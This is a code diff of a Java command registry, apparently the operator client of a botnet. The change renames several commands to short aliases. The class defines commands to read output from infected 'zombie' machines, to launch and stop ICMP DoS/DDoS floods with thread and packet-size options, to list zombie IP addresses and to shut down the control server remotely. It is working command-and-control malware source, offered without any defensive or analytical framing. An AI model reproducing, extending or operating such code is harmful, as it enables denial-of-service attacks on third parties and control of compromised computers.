@@ -34,10 +34,10 @@ public class ClientCommands {
 			@Override
 			public void commandCompleted(Command c, CommandData d) {
 				try {
-					if (c.getBaseCommand().equals("readzombie")) {
+					if (c.getBaseCommand().equals("rz")) {
 						ClientNetwork.getClient().getOutputStream().writeObject(
 								new DataPackage(c.getCommandArguments()[0]).setMessage("STOP_READ_ZOMBIE"));
-					} else if (c.getBaseCommand().equals("readserver")) {
+					} else if (c.getBaseCommand().equals("rs")) {
 						ClientNetwork.getClient().getOutputStream()
 								.writeObject(new DataPackage().setMessage("STOP_READ_SERVER"));
 					}
@@ -53,13 +53,12 @@ public class ClientCommands {
 						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
 						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
 						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
-		commands.putCommand("readzombie",
-				new CommandData("readzombie <address>",
+		commands.putCommand("rz",
+				new CommandData("rz <address>",
 						"Continuously reads the output from a zombie computer until the command is exited.", 1,
 						CommandActions.getReadFromZombieAction()));
-		commands.putCommand("readserver",
-				new CommandData("readserver",
-						"Continuously reads the output from the server until the command is exited.", 0,
+		commands.putCommand("rs",
+				new CommandData("rs", "Continuously reads the output from the server until the command is exited.", 0,
 						CommandActions.getReadFromServerAction()));
 		commands.putCommand("dos",
 				new CommandData("dos [start|stop] <address> {-l size, -t threads, -v valid}",
@@ -79,8 +78,8 @@ public class ClientCommands {
 				new CommandData("list {-a all}", "Gets the IP addresses of all zombies connected to the server.", 0,
 						CommandActions.getListZombiesAction(), new FlagData("-a",
 								"Gets the IP addresses of all computers connected to the server, including clients.")));
-		commands.putCommand("killserver", new CommandData("killserver", "Shuts down the server remotely.", 0,
-				CommandActions.getKillServerAction()));
+		commands.putCommand("ks",
+				new CommandData("ks", "Shuts down the server remotely.", 0, CommandActions.getKillServerAction()));
 		commands.putCommand("refresh",
 				new CommandData("refresh", "Removes all of the disconected zombies off of the server.", 0,
 						CommandActions.getRemoveDeadZombiesAction()));
